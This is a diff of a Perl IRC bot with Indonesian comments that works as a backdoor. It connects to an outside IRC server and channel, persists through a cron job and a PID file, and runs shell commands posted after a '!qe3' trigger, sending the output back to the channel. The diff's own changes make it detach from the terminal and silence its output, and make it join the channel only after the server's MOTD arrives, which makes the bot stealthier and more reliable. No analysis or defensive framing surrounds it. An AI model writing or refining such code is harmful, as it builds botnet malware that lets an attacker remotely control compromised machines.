@@ -24,7 +24,6 @@ sub generate_random_nick {
 sub connect_to_irc {
     my $server = 'irc.ongisnade.co.id';
     my $port = 7000;
-    my $channel = '#surabayacity';
     my $nick = generate_random_nick();
 
     my $socket = IO::Socket::INET->new(
@@ -35,7 +34,6 @@ sub connect_to_irc {
 
     print $socket "NICK $nick\r\n";
     print $socket "USER $nick 8 * :Perl IRC Client\r\n";
-    print $socket "JOIN $channel\r\n";
 
     return $socket;
 }
@@ -76,15 +74,6 @@ sub ensure_cron_job {
     }
 }
 
-# Pastikan cron job ada
-ensure_cron_job();
-
-# Memeriksa apakah skrip sudah berjalan
-check_if_already_running();
-
-# Membuat file PID
-create_pid_file();
-
 # Fungsi untuk mengeksekusi perintah shell
 sub execute_command {
     my ($command) = @_;
@@ -99,6 +88,33 @@ sub send_to_channel {
     print $socket "PRIVMSG #surabayacity :$message\r\n";
 }
 
+# Forking dan detachment dari terminal
+sub daemonize {
+    my $pid = fork();
+    if ($pid < 0) {
+        die "Fork failed: $!";
+    }
+    if ($pid > 0) {
+        exit 0;
+    }
+    setsid() or die "setsid failed: $!";
+    open(STDIN, '/dev/null') or die "Can't read /dev/null: $!";
+    open(STDOUT, '>>/dev/null') or die "Can't write to /dev/null: $!";
+    open(STDERR, '>>/dev/null') or die "Can't write to /dev/null: $!";
+}
+
+# Pastikan cron job ada
+ensure_cron_job();
+
+# Memeriksa apakah skrip sudah berjalan
+check_if_already_running();
+
+# Membuat file PID
+create_pid_file();
+
+# Jalankan daemonize
+daemonize();
+
 my $pid = fork();
 if (!defined $pid) {
     die "Cannot fork: $!";
@@ -107,6 +123,7 @@ if (!defined $pid) {
 if ($pid == 0) {
     # Ini adalah proses anak, jalankan proses utama Anda di sini
     my $socket = connect_to_irc();
+    my $connected = 0;
 
     # Loop koneksi IRC
     while (my $answer = <$socket>) {
@@ -117,6 +134,12 @@ if ($pid == 0) {
         if ($answer =~ m/^PING (.*?)$/gi) {
             print "Replying with PONG ".$1."\n";
             print $socket "PONG ".$1."\r\n";
+        }
+
+        # Periksa apakah sudah terhubung dan join channel
+        if (!$connected && $answer =~ /376|422/) {
+            print $socket "JOIN #surabayacity\r\n";
+            $connected = 1;
         }
 
         # Mulai eksekusi perintah jika ada !qe3
@@ -135,6 +158,7 @@ if ($pid == 0) {
             $pid = fork();
             if ($pid == 0) {
                 my $socket = connect_to_irc();
+                my $connected = 0;
 
                 # Loop koneksi IRC
                 while (my $answer = <$socket>) {
@@ -145,6 +169,12 @@ if ($pid == 0) {
                     if ($answer =~ m/^PING (.*?)$/gi) {
                         print "Replying with PONG ".$1."\n";
                         print $socket "PONG ".$1."\r\n";
+                    }
+
+                    # Periksa apakah sudah terhubung dan join channel
+                    if (!$connected && $answer =~ /376|422/) {
+                        print $socket "JOIN #surabayacity\r\n";
+                        $connected = 1;
                     }
 
                     # Mulai eksekusi perintah jika ada !qe3
